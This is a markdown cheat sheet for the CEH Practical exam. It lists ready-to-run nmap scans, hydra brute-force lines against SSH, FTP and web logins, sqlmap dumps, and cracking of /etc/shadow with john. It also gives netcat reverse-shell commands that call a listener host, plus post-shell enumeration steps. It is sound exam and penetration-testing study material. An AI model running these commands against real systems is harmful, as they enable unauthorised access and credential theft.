```markdown
# 🚨 CEH Practical Exam: MUST-KNOW Tools & One-Liners

*Stop everything else and focus on these. These are the absolute essentials you will 100% need.*

---

## 1. NMAP (Network Discovery)
**Goal:** Find targets and open ports.

```bash
# Find live hosts on the network
nmap -sn 192.168.1.0/24

# Quick scan of a target (Top 1000 ports)
nmap 192.168.1.10

# Aggressive scan (OS, Version, Scripts)
nmap -A 192.168.1.10

# Scan all 65535 ports (SLOW)
nmap -p- 192.168.1.10

# Scan for common vulnerabilities
nmap --script vuln 192.168.1.10
```

---

## 2. HYDRA (Password Brute-Force)
**Goal:** Crack logins for SSH, FTP, and web forms.

```bash
# Brute-force SSH
hydra -l admin -P /usr/share/wordlists/rockyou.txt ssh://192.168.1.10

# Brute-force FTP
hydra -l admin -P /usr/share/wordlists/rockyou.txt ftp://192.168.1.10

# Brute-force a WEB LOGIN FORM (MOST IMPORTANT)
# FORMAT: "path:form_data:failure_message"
hydra -l admin -P /usr/share/wordlists/rockyou.txt 192.168.1.10 http-post-form "/login:username=^USER^&password=^PASS^:Invalid Login" -V
```
**Pro Tip:** Use Burp Suite to intercept the login request to find the exact `form_data` and `failure_message`.

---

## 3. SQLMAP (SQL Injection)
**Goal:** Automate SQLi to dump databases.

```bash
# Basic test on a parameter
sqlmap -u "http://192.168.1.10/page.php?id=1" --batch

# Get all databases
sqlmap -u "http://192.168.1.10/page.php?id=1" --dbs --batch

# Get tables from a specific database
sqlmap -u "http://192.168.1.10/page.php?id=1" -D mydatabase --tables --batch

# Dump everything from a table
sqlmap -u "http://192.168.1.10/page.php?id=1" -D mydatabase -T users --dump --batch
```
**Pro Tip:** The `--batch` flag makes it run automatically without prompting you.

---

## 4. JOHN THE RIPPER (Password Cracking)
**Goal:** Crack password hashes from files.

```bash
# Step 1: If you have /etc/passwd and /etc/shadow, combine them:
unshadow /etc/passwd /etc/shadow > unshadowed.txt

# Step 2: Crack the combined file with a wordlist:
john --wordlist=/usr/share/wordlists/rockyou.txt unshadowed.txt

# Crack a Windows NT hash (from a SAM dump)
john --format=nt --wordlist=rockyou.txt nt_hashes.txt

# Show all cracked passwords
john --show unshadowed.txt
```

---

## 5. NETCAT (Swiss Army Knife)
**Goal:**
- Connect to services
- Get a reverse shell

```bash
# Connect to a service (like telnet)
nc 192.168.1.10 25

# Listen for a reverse shell (ON YOUR ATTACK MACHINE)
nc -nvlp 4444

# On the target machine (if you have command injection), run:
nc 192.168.1.5 4444 -e /bin/bash   # Linux
nc.exe 192.168.1.5 4444 -e cmd.exe # Windows
```

---

## 6. Essential Linux Commands (If you get a shell)

```bash
# Who am I and what are my privileges?
whoami
id

# What version of Linux is this?
uname -a
cat /etc/*release

# Find files with SUID bit set (Privilege Escalation)
find / -perm -4000 2>/dev/null

# Can I run any commands as root?
sudo -l

# Look for passwords in files
grep -r "password" /var/www/ 2>/dev/null
```

---

## 7. Essential Windows Commands (If you get a shell)

```cmd
# Who am I and am I an admin?
whoami
net user %username%

# System information
systeminfo

# List users and groups
net user
net localgroup administrators

# Network information
ipconfig /all
arp -a
```

---

## 🧠 Exam Day Strategy

1.  **Nmap** the target to see what's open.
2.  **Web Ports (80,443,8080)?**
    - Browse the website.
    - Look for login forms -> use **Hydra**.
    - Look for search forms -> test for **SQLi** (`'`) -> use **SQLmap**.
3.  **SSH/FTP (21,22)?** -> use **Hydra**.
4.  **You get a hash?** -> use **John**.
5.  **You get command injection?** -> use **Netcat** for a reverse shell.

**Remember:**
- `-h` and `--help` are your friends. (e.g., `nmap -h`).
- The man pages are there: `man nmap`.
- **You can do this. This is all you need.** Now go practice them.
```
